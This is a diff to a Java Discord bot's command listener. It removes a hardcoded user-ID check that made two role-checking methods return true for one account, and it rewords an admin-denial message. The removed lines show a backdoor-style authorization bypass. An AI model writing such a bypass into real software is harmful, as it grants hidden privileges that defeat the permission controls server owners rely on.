@@ -22,9 +22,6 @@ public class CommandListener implements MessageCreateListener {
 	private HashMap<User, Long> commandCooldown = new HashMap<>();
 
 	private boolean hasRole(User user, Server server, String roleName, boolean caseSensitive){
-		if (user.getId().equalsIgnoreCase("113462564217683968")){
-			return true;
-		}
 		if (caseSensitive) {
 			for (Role r : user.getRoles(server)) {
 				if (r.getName().equalsIgnoreCase(roleName)) {
@@ -38,9 +35,6 @@ public class CommandListener implements MessageCreateListener {
 	}
 
 	private boolean hasRole(User user, Server server, String roleName){
-		if (user.getId().equalsIgnoreCase("113462564217683968")){
-			return true;
-		}
 		for (Role r : user.getRoles(server)){
 			if (r.getName().equals(roleName)){
 				return true;
@@ -91,7 +85,7 @@ public class CommandListener implements MessageCreateListener {
 
 					if (adminOnly){
 						if (!(JavacordCommander.getInstance().getAdminUsers().contains(message.getAuthor().getId()))){
-							String reply = Settings.getMsgStarter() + "You are not one of my `Senpai's` :heart:";
+							String reply = Settings.getMsgStarter() + "You are not one on my Admin List! Sorry!";
 							if (sendPM){
 								message.getAuthor().sendMessage(reply);
 							}else{
